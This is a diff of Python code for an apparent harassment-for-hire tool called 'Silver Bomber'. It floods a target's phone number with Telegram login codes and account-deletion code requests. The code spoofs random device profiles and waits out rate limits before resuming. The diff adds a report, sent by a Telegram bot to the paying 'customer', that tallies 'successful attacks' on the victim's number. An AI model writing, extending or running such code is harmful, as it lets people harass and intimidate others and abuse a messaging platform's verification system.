@@ -7,6 +7,7 @@ from concurrent.futures import ThreadPoolExecutor
 from telethon import TelegramClient, errors
 from telethon.sessions import StringSession
 import aiohttp
+from config import *
 from config import api_hash, api_id, DEVICE_CONFIGS, TELEGRAM_SITES, url, headers, TOKEN, ADMIN_ID
 from device_config import get_random_device_config
 from fast__method import spam_notification_sync
@@ -19,7 +20,21 @@ log_dir = "logs"
 if not os.path.exists(log_dir):
     os.makedirs(log_dir)
 
+# Глобальная переменная для файла логов (может быть переопределена через set_log_file)
 log_file = os.path.join(log_dir, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
+
+def set_log_file(log_file_path):
+    """Устанавливает файл для логирования в bomber.py"""
+    global log_file
+    log_file = log_file_path
+    # Создаем файл, если его нет
+    try:
+        os.makedirs(os.path.dirname(log_file) if os.path.dirname(log_file) else ".", exist_ok=True)
+        if not os.path.exists(log_file):
+            with open(log_file, "w", encoding="utf-8") as f:
+                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [INFO] Лог-файл создан\n")
+    except Exception as e:
+        print(f"Ошибка создания файла логов: {e}")
 
 def bomber_write_log(level, message):
     """Самодельная функция логирования в .txt файл для bomber"""
@@ -49,30 +64,147 @@ bot = Bot(token=TOKEN) if TOKEN else None
 def clear_console():
     os.system('cls' if os.name == 'nt' else 'clear')
 
-async def send_log_file(log_file_path, phone_number, user_id=None):
-    """Отправляет файл логов через Telegram клиенту или админу"""
+async def send_log_file(log_file_path, phone_number, user_id=None, customer_username="Не указан", start_time=None, end_time=None, duration=None):
+    """Отправляет файл логов через Telegram клиенту или админу с красивым отчетом"""
     if not bot:
-        log_warning("[SEND LOG] Telegram бот не инициализирован, логи не отправлены")
-        return
+        error_msg = "[SEND LOG] Telegram бот не инициализирован, логи не отправлены. Проверьте TOKEN в config.py"
+        log_error(error_msg)
+        raise Exception(error_msg)
     
     try:
         if not os.path.exists(log_file_path):
-            log_error(f"[SEND LOG] Файл логов не найден: {log_file_path}")
-            return
+            error_msg = f"[SEND LOG] Файл логов не найден: {log_file_path}"
+            log_error(error_msg)
+            raise FileNotFoundError(error_msg)
+        
+        # Проверяем размер файла
+        file_size = os.path.getsize(log_file_path)
+        log_info(f"[SEND LOG] Размер файла логов: {file_size} байт")
+        
+        # Читаем лог-файл и анализируем
+        successful_attacks = 0
+        errors = 0
+        log_lines = []
+        
+        try:
+            with open(log_file_path, "r", encoding="utf-8") as f:
+                log_lines = f.readlines()
+                
+            # Анализируем логи
+            for line in log_lines:
+                line_lower = line.lower()
+                # Подсчитываем успешные атаки
+                if any(keyword in line_lower for keyword in ["запрос кода отправлен", "успешно запрошен", "успешный запрос", "successful", "код отправлен"]):
+                    if "ошибка" not in line_lower and "error" not in line_lower and "неудачный" not in line_lower:
+                        successful_attacks += 1
+                # Подсчитываем ошибки
+                if any(keyword in line_lower for keyword in ["[error]", "[warning]", "ошибка", "error", "неудачный", "failed", "exception", "timeout", "floodwait"]):
+                    if "успешно" not in line_lower and "success" not in line_lower:
+                        errors += 1
+        except Exception as e:
+            log_error(f"[SEND LOG] Ошибка при чтении лог-файла: {str(e)}")
+        
+        # Создаем красивый отчет
+        report_filename = os.path.join(log_dir, f"silver!bomber_{datetime.now().strftime('%Y%m%d_%H%M')}.txt")
+        
+        with open(report_filename, "w", encoding="utf-8") as f:
+            # Заголовок
+            f.write("=" * 70 + "\n")
+            f.write(" " * 20 + " Silver Bomber\n")
+            f.write("=" * 70 + "\n\n")
+            
+            # Информация о цели
+            f.write("ИНФОРМАЦИЯ ОБ АТАКЕ:\n")
+            f.write("-" * 70 + "\n")
+            f.write(f"[+] Номер телефона: {phone_number}\n")
+            f.write(f"[+] Заказчик: {customer_username}\n")
+            if start_time:
+                f.write(f"[!] Дата начала: {start_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+            if end_time:
+                f.write(f"[!] Дата окончания: {end_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+            if duration:
+                minutes = int(duration // 60)
+                seconds = int(duration % 60)
+                f.write(f"[?]  Длительность: {minutes} мин {seconds} сек\n")
+            f.write("\n")
+            
+            # Статистика
+            f.write("СТАТИСТИКА:\n")
+            f.write("-" * 70 + "\n")
+            f.write(f"[+] Успешных атак: {successful_attacks}\n")
+            f.write(f"[-] Ошибок: {errors}\n")
+            total_attempts = successful_attacks + errors
+            if total_attempts > 0:
+                success_rate = (successful_attacks / total_attempts) * 100
+                f.write(f"[%] Процент успеха: {success_rate:.1f}%\n")
+            f.write("\n")
+            
+            # Детальные логи
+            f.write("Подробнее\n")
+            f.write("-" * 70 + "\n")
+            for line in log_lines:
+                f.write(line)
         
         # Отправляем клиенту, если указан, иначе админу
         recipient_id = user_id if user_id else ADMIN_ID
-        log_info(f"[SEND LOG] Отправка файла логов: {log_file_path} пользователю {recipient_id}")
+        log_info(f"[SEND LOG] Отправка файла логов: {report_filename} пользователю {recipient_id}")
+        log_info(f"[SEND LOG] Размер отчета: {os.path.getsize(report_filename)} байт")
         
-        await bot.send_document(
-            chat_id=recipient_id,
-            document=FSInputFile(log_file_path),
-            caption=f"📄 Логи доставки для номера: {phone_number}\n"
-                   f"📅 Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-        )
-        log_info(f"[SEND LOG] Файл логов успешно отправлен пользователю {recipient_id}")
+        # Формируем подпись для файла
+        duration_text = ""
+        if duration:
+            minutes = int(duration // 60)
+            seconds = int(duration % 60)
+            duration_text = f"⏱️  Время: {minutes} мин {seconds} сек"
+        else:
+            duration_text = "⏱️  Время: не указано"
+        
+        # Проверяем существование файла отчета перед отправкой
+        if not os.path.exists(report_filename):
+            error_msg = f"[SEND LOG] Файл отчета не создан: {report_filename}"
+            log_error(error_msg)
+            raise FileNotFoundError(error_msg)
+        
+        try:
+            await bot.send_document(
+                chat_id=recipient_id,
+                document=FSInputFile(report_filename),
+                caption=f"📄 <b>Отчет о доставке</b>\n\n"
+                       f"🎯 Номер: <code>{phone_number}</code>\n"
+                       f"👤 Заказчик: {customer_username}\n"
+                       f"✅ Успешных атак: {successful_attacks}\n"
+                       f"❌ Ошибок: {errors}\n"
+                       f"{duration_text}",
+                parse_mode="html",
+                reply_markup=back_btn
+                
+            )
+            log_info(f"[SEND LOG] Файл логов успешно отправлен пользователю {recipient_id}")
+        except Exception as send_error:
+            error_msg = f"[SEND LOG] Ошибка при отправке документа через Telegram: {str(send_error)}"
+            log_error(error_msg)
+            log_error(f"[SEND LOG] Тип ошибки: {type(send_error).__name__}")
+            raise Exception(error_msg) from send_error
+        
+        # Удаляем временный файл отчета через некоторое время
+        try:
+            await asyncio.sleep(5)
+            if os.path.exists(report_filename):
+                os.remove(report_filename)
+        except:
+            pass
+            
+    except FileNotFoundError as e:
+        # Пробрасываем FileNotFoundError дальше
+        log_error(f"[SEND LOG] Файл не найден: {str(e)}")
+        raise
     except Exception as e:
-        log_error(f"[SEND LOG] Ошибка при отправке файла логов: {str(e)}")
+        error_msg = f"[SEND LOG] Критическая ошибка при отправке файла логов: {str(e)}"
+        log_error(error_msg)
+        import traceback
+        log_error(f"[SEND LOG] Traceback: {traceback.format_exc()}")
+        # Пробрасываем исключение дальше, чтобы его можно было обработать в syym_start.py
+        raise Exception(error_msg) from e
 
 async def request_delete_account_code(phone_number):
     """Запрос одного кода удаления аккаунта"""
@@ -127,88 +259,95 @@ async def spam_delete_codes(phone_number):
     log_info(f"[DELETE CODE SPAM] Завершено {request_count} запросов для {phone_number}")
 
 async def send_code(phone_number):
-    """Отправка обычных кодов входа"""
+    """Отправка обычных кодов входа - полностью async"""
     log_info(f"[SEND CODE] Начало отправки кодов для номера: {phone_number}")
     request_count = 0
     max_requests = 50
     max_retries = 5
-    
+
     while request_count < max_requests:
-        log_info(f"[SEND CODE] Запрашиваю код для {phone_number} (запрос #{request_count + 1}/{max_requests})")
-        
+        log_info(f"[SEND CODE] Запрашиваю код для {phone_number} (#{request_count + 1}/{max_requests})")
+
         device_config = get_random_device_config()
         log_debug(f"[SEND CODE] Устройство: {device_config['device_model']} ({device_config['platform']})")
-        
+
         for attempt in range(max_retries):
             client = None
             try:
                 session = StringSession()
                 client = TelegramClient(
-                    session, 
-                    api_id, 
+                    session,
+                    api_id,
                     api_hash,
                     device_model=device_config["device_model"],
                     system_version=device_config["system_version"],
                     app_version=device_config["app_version"],
                     system_lang_code=device_config["system_lang_code"]
                 )
-                
+
+                # async connect with timeout
                 await asyncio.wait_for(client.connect(), timeout=15)
-                
+
                 if not await client.is_user_authorized():
                     if device_config["platform"] == "web":
                         web_site = random.choice(TELEGRAM_SITES)
                         log_debug(f"[SEND CODE] Эмулирую вход с сайта: {web_site}")
-                    
+
                     await client.send_code_request(phone_number)
-                    log_info(f"[SEND CODE] Запрос кода отправлен (запрос #{request_count + 1})")
+                    log_info(f"[SEND CODE] Запрос кода отправлен (#{request_count + 1})")
                     request_count += 1
                     break
                 else:
                     log_warning(f"[SEND CODE] Аккаунт уже авторизован")
                     break
-                    
+
             except errors.FloodWaitError as e:
                 wait_time = e.seconds + random.randint(25, 43)
-                log_warning(f"[SEND CODE] FloodWaitError: ждем {wait_time} секунд (номер: {phone_number})")
-                time.sleep(wait_time)
+                log_warning(f"[SEND CODE] FloodWaitError: ждем {wait_time} сек")
+                await asyncio.sleep(wait_time)
                 break
+
             except (ConnectionError, TimeoutError, errors.SecurityError, errors.BadMessageError) as e:
-                log_warning(f"[SEND CODE] Сетевая ошибка (попытка {attempt + 1}/{max_retries}, номер: {phone_number}): {str(e)}")
+                log_warning(f"[SEND CODE] Сетевая ошибка {attempt+1}/{max_retries}: {str(e)}")
                 if attempt < max_retries - 1:
                     wait_time = random.randint(3, 8)
-                    log_debug(f"[SEND CODE] Повтор через {wait_time} секунд...")
-                    time.sleep(wait_time)
+                    log_debug(f"[SEND CODE] Повтор через {wait_time} сек")
+                    await asyncio.sleep(wait_time)
+
             except asyncio.TimeoutError:
-                log_warning(f"[SEND CODE] Таймаут соединения (попытка {attempt + 1}/{max_retries}, номер: {phone_number})")
+                log_warning(f"[SEND CODE] Таймаут соединения {attempt+1}/{max_retries}")
                 if attempt < max_retries - 1:
-                    time.sleep(5)
+                    await asyncio.sleep(5)
+
             except errors.PhoneNumberBannedError:
                 log_error(f"[SEND CODE] Номер забанен: {phone_number}")
                 return
+
             except errors.PhoneNumberInvalidError:
                 log_error(f"[SEND CODE] Неверный номер: {phone_number}")
                 return
+
             except errors.PhoneNumberUnoccupiedError:
                 log_error(f"[SEND CODE] Номер не зарегистрирован: {phone_number}")
                 return
+
             except Exception as e:
-                log_error(f"[SEND CODE] Ошибка (попытка {attempt + 1}/{max_retries}, номер: {phone_number}): {str(e)}")
+                log_error(f"[SEND CODE] Ошибка {attempt+1}/{max_retries}: {str(e)}")
                 if attempt < max_retries - 1:
-                    time.sleep(5)
+                    await asyncio.sleep(5)
+
             finally:
                 if client:
                     try:
                         await client.disconnect()
                     except:
                         pass
-        
-        # задержка между запросами
+
         if request_count < max_requests:
             sleep_time = random.randint(30, 44)
-            log_debug(f"[SEND CODE] Ожидание {sleep_time} секунд перед следующим запросом")
-            time.sleep(sleep_time)
-    
+            log_debug(f"[SEND CODE] Ожидание {sleep_time} сек")
+            await asyncio.sleep(sleep_time)
+
     log_info(f"[SEND CODE] Выполнено {request_count} запросов для {phone_number}")
 
 async def run_fast_method(phone_number, log_dir):
